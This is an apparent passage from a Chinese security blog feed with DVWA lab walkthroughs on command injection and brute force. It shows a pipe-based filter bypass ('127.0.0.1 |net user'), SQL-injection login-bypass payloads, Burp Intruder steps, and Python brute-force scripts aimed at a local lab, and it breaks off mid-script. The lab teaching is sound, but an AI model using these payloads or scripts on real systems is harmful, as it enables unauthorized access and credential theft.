class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次过滤的更狠，几乎过滤了所有的常用连接符，拼接的方法也是不起作用的，但是观察代码发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119223049538.png" alt="image-20220119223049538"></p><p><code>|+空格</code>多出一个空格，所以不会过滤<code>|</code>那就利用这个漏洞进行命令执行</p><h3 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 |net user</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119223211246.png" alt="image-20220119223211246"></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>切换难度为impossible</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119223357929.png" alt="image-20220119223357929"></p><h3 id="观察源码-3"><a href="#观察源码-3" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripslashes(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">#stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</span></span><br><span class="line">explode(separator,<span class="keyword">string</span>,limit)</span><br><span class="line"><span class="comment">#explode()函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目</span></span><br><span class="line">is_numeric(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">#is_numeric()函数检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</span></span><br></pre></td></tr></table></figure><p>Impossible级别的代码加入了<code>Anti-CSRF token</code>，同时对<code>参数ip</code>进行了严格的限制，只有“<code>数字.数字.数字.数字</code>”的输入才会被接收执行，因此不存在命令注入漏洞。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>命令执行：</strong>  </p><p><strong>PHP</strong>：system、exec、shell_exec、passthru、popen、proc_popen等称为高危漏洞。  </p><p><strong>原理</strong>：只要程序可以调用系统命令的情况下都可以发生命令执行漏洞。  </p><p><strong>条件</strong>：用户能够控制函数输入，存在可以执行代码的危险函数。    </p><p><strong>命令执行漏洞产生原因：</strong>  开发人员没有对特殊函数入口做过滤，导致用户可以提交恶意代码并提交服务端执行。  Web服务器没有过滤危险函数导致命令执行漏洞攻击成功。    </p><p><strong>命令执行漏洞带来的危害</strong>：    </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、继承Web服务程序的权限去执行系统命令或读写文件。  </span><br><span class="line">2、反弹shell  </span><br><span class="line">3、控制整个网站甚至控制服务器。  </span><br><span class="line">4、进一步内网渗透    </span><br></pre></td></tr></table></figure><p><strong>PHP中的危险函数：</strong>    </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system：成功则返回命令输出的最后一行，失败则返回<span class="literal">FALSE</span>。  </span><br><span class="line">exec：命令执行结果的最后一行内容。  </span><br><span class="line">shell_exec：命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回<span class="literal">NULL</span>。  </span><br><span class="line">passthru：执行外部程序并且显示原始输出。  </span><br><span class="line"><span class="keyword">eval</span>：将输入的字符串参数当做PHP程序代码来执行。  </span><br><span class="line">assert  </span><br><span class="line">preg_replace  </span><br><span class="line">call_user_func </span><br></pre></td></tr></table></figure><p><strong>命令执行的防御：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、尽量不要执行外部命令。</span><br><span class="line">2、使用自定义函数或者函数库来代替外部命令的功能。</span><br><span class="line">3、使用escapeshe||arg函数来处理命令参数。</span><br><span class="line">4、使用safe_mode_exec_dir指定可执行文件的路径。（safe_mode_exec_dir指定路径时可以把会使用的命令提前放入此路径内。）</span><br></pre></td></tr></table></figure><p>总之，纸上得来终觉浅，绝知此事要躬行。多操作多练习！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解（Brute_Force）</title>
      <link href="/2022/01/19/CTF/Web/dvwa/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%88Brute_Force%EF%BC%89/"/>
      <url>/2022/01/19/CTF/Web/dvwa/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%88Brute_Force%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="暴力破解（Brute-Force）"><a href="#暴力破解（Brute-Force）" class="headerlink" title="暴力破解（Brute_Force）"></a>暴力破解（Brute_Force）</h1><h1 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h1><p>使用攻击者准备的自己的用户名和密码，一个一个枚举，尝试是否能登陆</p><p>理论来说，字典够大，就能破解</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>环境：phpstudy和dvwa</p><p>工具：burp suite</p><p>这里省略安装。。</p><p>可参考这个过程</p><p><a href="https://blog.csdn.net/weixin_42045038/article/details/81586016">https://blog.csdn.net/weixin_42045038/article/details/81586016</a></p><h1 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h1><p>进入dvwa，设置为low难度</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119104044105.png" alt="image-20220119104044105"></p><p>然后进入brute Force板块</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;<span class="comment">//是否提交了login参数</span></span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];<span class="comment">//接受usename传给user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];<span class="comment">//接受password传给pass</span></span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );<span class="comment">//给passmd5加密</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;<span class="comment">//sql语句查询，从users表里面查询所有user=‘user’并且password=‘pass’的值</span></span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> .((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );<span class="comment">//连接错误，或者没有设置连接就会报错</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;<span class="comment">//结果存在并且行数等于一</span></span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );<span class="comment">//结果集中取得一行作为关联数组放在row里面</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];<span class="comment">//row的avatar下标</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<span class="comment">//输出avatar对应的图片</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//如果验证失败就会返回登录失败</span></span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//没有提交login参数就不执行任何操作</span></span><br></pre></td></tr></table></figure><p>获取用户名、密码（md5加密）、使用数据库查询语句进行数据库查询、结果判断是否存在</p><p>判断语句：如果查询结果在数据库中存在，得到用户详细信息，显示welcome……，否则返回用户名和（或）密码错误。</p><p>从源码中发现对**$user**没有做任何过滤，存在明显的sql注入漏洞；</p><p>而**$pass**设置了md5加密算法，杜绝了通过参数password进行sql注入的可能性。</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>随便输入账号密码</p><p>brup代理拦截</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119105055180.png" alt="image-20220119105055180"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119105153816.png" alt="image-20220119105153816"></p><p>点击action选择send to intruder（发送到爆破模块）</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119105336528.png" alt="image-20220119105336528"></p><p>进入到intruder模块</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119105927076.png" alt="image-20220119105927076"></p><p><strong>这里拓展一下attack type</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种：</span><br><span class="line">Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</span><br><span class="line"></span><br><span class="line">第三种：</span><br><span class="line">Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</span><br><span class="line"></span><br><span class="line">第四种：</span><br><span class="line">Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</span><br></pre></td></tr></table></figure><p>$符号包裹住的内容是攻击目标，点击clear先清除它自动选中的目标</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110001254.png" alt="image-20220119110001254"></p><p>然后添加攻击目标，这里为了提高爆破速度，假设用户名username已知，只针对密码password进行爆破。</p><p>先选中password，然后点击add$</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110158087.png" alt="image-20220119110158087"></p><p>添加payload（测试的密码）</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110517628.png" alt="image-20220119110517628"></p><p>payload类型可以选择simple list，然后点击add from list-&gt;选择passwords类型</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110618230.png" alt="image-20220119110618230"></p><p>可以看到下图红框内有东西就说明添加成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110736623.png" alt="image-20220119110736623"></p><p>设置线程，网络失败重试多少次，多少秒重试，按照自己电脑性能调试，一般默认就行。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110326207.png" alt="image-20220119110326207"></p><p>点击start attack</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110423964.png" alt="image-20220119110423964"></p><p>点length，按响应长度排序</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119110934379.png" alt="image-20220119110934379"></p><p>一般不一样的那个就是正确破解的，可以看到只有password是4603,，其他都是4560</p><p>还可以点开查看响应报文或者直接render浏览器渲染一下结果</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111138739.png" alt="image-20220119111138739"></p><p>可以看出登录成功了</p><p>说明这里爆破出密码是password</p><p>试了试果然可以</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111242680.png" alt="image-20220119111242680"></p><h2 id="补充：SQL注入"><a href="#补充：SQL注入" class="headerlink" title="补充：SQL注入"></a>补充：SQL注入</h2><p>手工sql注入</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111535087.png" alt="image-20220119111535087"></p><p>可以看到登陆成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111608262.png" alt="image-20220119111608262"></p><p>注入成功</p><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name from &#x27;users&#x27; where name=&#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1=1 永远为真</span><br></pre></td></tr></table></figure><p>或者</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111820713.png" alt="image-20220119111820713"></p><p>注入成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119111831928.png" alt="image-20220119111831928"></p><p>原理：# 为注释 后面均无效</p><h1 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h1><p>难度设置成medium级别</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119112830531.png" alt="image-20220119112830531"></p><h2 id="分析源码-1"><a href="#分析源码-1" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;<span class="comment">//是否提交login</span></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];<span class="comment">//获取username值</span></span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));<span class="comment">//通过mysqli_real_escape_string过滤user的不正常参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>发现只是对user和password<strong>加了对sql语法的过滤</strong>，如单引号双引号</p><p>与之前low等级源码，明显在判断login参数是否设置中，用户名和密码均添加了<strong>mysql_escape_string（）函数</strong></p><p>这个函数会对字符串中的特殊符号<strong>（x00，n，r，，’，”，x1a）</strong>进行转义，<strong>基本上能够抵御sql注入攻击。</strong></p><p>说基本上是因为查到说 <strong>MySQL5.5.37以下版本</strong>如果<strong>设置编码为GBK</strong>，能够<strong>构造编码绕过mysql_real_escape_string 对单引号的转义；即宽字节注入</strong>。</p><p>同时，**$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。**</p><p>但是，依然<strong>没有加入有效的防爆破机制。</strong></p><p>中间有个<strong>sleep(2)<strong>的php函数，即是如果账号或者密码错误，</strong>程序停止运行两秒，导致medium等级的爆破所用时间更长</strong></p><p><strong>具体的mysql_real_escape_string函数绕过问题详见</strong></p><p><a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p><p>按照低级别的方法还是可以，但是按照low级别的sql注入不行了</p><p>这里不再叙述</p><h2 id="补充：python脚本"><a href="#补充：python脚本" class="headerlink" title="补充：python脚本"></a>补充：python脚本</h2><p>用之前需要先抓包，将headers里的cookie替换掉</p><p>需要自己在脚本的目录准备username.txt和password.txt。</p><p>常见的字典可以从这里获取</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p><strong>单线程的脚本</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author:Mikasu</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/dvwa/vulnerabilities/brute/&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;security=low; PHPSESSID=eviiiqis8na93phktk2c85ups6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line1 <span class="keyword">in</span> f1:</span><br><span class="line">    username = line1.strip()</span><br><span class="line"></span><br><span class="line">    f2 = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line2 <span class="keyword">in</span> f2:</span><br><span class="line">        password=line2.strip()</span><br><span class="line">        params = &#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;Login&#x27;</span>: <span class="string">&#x27;login&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url, params=params, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome to the password protected area&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31;1musername:%s,password:%s----right account!\033[0m&quot;</span>%(username,password))</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;username:%s,password:%s----wrong account!&quot;</span>%(username,password))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f2.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>多线程的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Author:Mikasu</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    semaphore.acquire()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dvwa/vulnerabilities/brute/&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;security=medium; PHPSESSID=eviiiqis8na93phktk2c85ups6&quot;</span>&#125;</span><br><span class="line">    params = &#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;Login&#x27;</span>: <span class="string">&#x27;login&#x27;</span>&#125;</span><br><span class="line">    response = requests.get(url, params=params, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Welcome to the password protected area&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span 